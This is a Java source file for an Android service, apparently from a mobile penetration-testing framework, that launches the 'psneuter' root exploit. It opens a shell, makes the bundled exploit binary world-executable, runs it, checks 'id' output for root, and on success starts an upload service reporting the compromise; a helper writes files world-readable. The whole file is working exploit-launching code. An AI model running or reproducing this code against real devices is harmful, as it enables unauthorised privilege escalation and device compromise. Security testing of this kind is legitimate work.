package com.bulbsecurity.framework;

import jackpal.androidterm.Exec;

import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Calendar;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class PSNeuter extends Service {

	@Override
	public void onCreate() {
		
	}
	
	@Override
	public void onStart(Intent intent, int startID)  {
		try {
			//SaveIncludedFileIntoFilesFolder(R.raw.psneuter, "psneuter", getApplicationContext());
		} catch (Exception e) {

			e.printStackTrace();
		}

		final int[] processId = new int[1];
		final FileDescriptor fd = Exec.createSubprocess("/system/bin/sh", "-", null, processId);

		final FileOutputStream out = new FileOutputStream(fd);
		final FileInputStream in = new FileInputStream(fd);

		
		
		try {
			String command = "chmod 777 " + getFilesDir() + "/psneuter\n";
			out.write(command.getBytes());
			out.flush();
			command = getFilesDir() + "/psneuter\n";
			out.write(command.getBytes());
			out.flush();
			
			command = "id\n";
			out.write(command.getBytes());
			out.flush();
			byte[] mBuffer = new byte[4096];
			int read = 0;
			while (read >= 0) {
			read = in.read(mBuffer);
			String str = new String(mBuffer, 0, read);
			 Log.i("AAA", str);
			 if (str.contains("uid="))
			 {
				if (str.contains("root")) {
					Intent intent3 = new Intent(getApplicationContext(),WebUploadService.class);
					intent3.putExtra("uploadstring", "Psneuter");
					Context context = getApplicationContext();
					context.startService(intent3);
				
				
					break;
				}
				else {
					break;
				}
			}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static void SaveIncludedFileIntoFilesFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
		InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
		FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
		byte[] bytebuf = new byte[1024];
		int read;
		while ((read = is.read(bytebuf)) >= 0) {
			fos.write(bytebuf, 0, read);
		}
		is.close();
		fos.getChannel().force(true);
		fos.flush();
		fos.close();
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	public void onDestroy() {
	
	}
}
